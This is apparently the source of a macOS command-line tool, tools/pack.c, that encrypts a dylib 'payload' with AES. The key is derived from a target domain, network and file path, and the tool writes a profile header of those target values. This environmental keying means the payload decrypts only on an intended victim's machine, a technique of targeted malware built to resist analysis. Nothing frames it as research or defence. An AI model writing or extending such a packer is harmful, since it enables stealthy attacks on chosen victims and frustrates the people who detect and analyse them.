/* tools/pack.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonDigest.h>

static void derive_key_from_env(const char *env_data, uint8_t key[16], uint8_t iv[16]) {
    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(env_data, (CC_LONG)strlen(env_data), hash);
    for (int i = 0; i < 999; i++) {
        CC_SHA256(hash, CC_SHA256_DIGEST_LENGTH, hash);
    }
    memcpy(key, hash, 16);
    memcpy(iv, hash + 16, 16);
}

int main(int argc, char **argv) {
    if (argc != 6) {
        fprintf(stderr, "Usage: %s <payload.dylib> <output.enc> <domain> <network> <file>\n", argv[0]);
        return 1;
    }
    
    FILE *f = fopen(argv[1], "rb");
    if (!f) { return 1; }
    fseek(f, 0, SEEK_END);
    size_t plen = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t *payload = malloc(plen);
    fread(payload, 1, plen, f);
    fclose(f);
    
    char env_data[512];
    snprintf(env_data, sizeof(env_data), "%s|%s|%s", argv[3], argv[4], argv[5]);
    
    uint8_t key[16], iv[16];
    derive_key_from_env(env_data, key, iv);
    
    size_t outlen = plen + kCCBlockSizeAES128;
    uint8_t *encrypted = malloc(outlen);
    size_t moved = 0;
    
    CCCryptorStatus status = CCCrypt(
        kCCEncrypt, kCCAlgorithmAES, kCCOptionPKCS7Padding,
        key, 16, iv, payload, plen, encrypted, outlen, &moved
    );
    
    if (status != kCCSuccess) {
        fprintf(stderr, "Encryption failed: %d\n", status);
        return 1;
    }
    
    f = fopen(argv[2], "wb");
    if (!f) { perror("fopen output"); return 1; }
    fwrite(encrypted, 1, moved, f);
    fclose(f);
    
    printf("Encrypted %zu -> %zu bytes\n", plen, moved);
    
    char profile_path[512];
    snprintf(profile_path, sizeof(profile_path), "%s.profile", argv[2]);
    f = fopen(profile_path, "w");
    if (f) {
        fprintf(f, "const char TARGET_DOMAIN[] = \"%s\";\n", argv[3]);
        fprintf(f, "const char TARGET_NETWORK[] = \"%s\";\n", argv[4]);
        fprintf(f, "const char TARGET_FILE[] = \"%s\";\n", argv[5]);
        fclose(f);
        printf("Profile written to: %s\n", profile_path);
    }
    
    free(payload);
    free(encrypted);
    return 0;
}
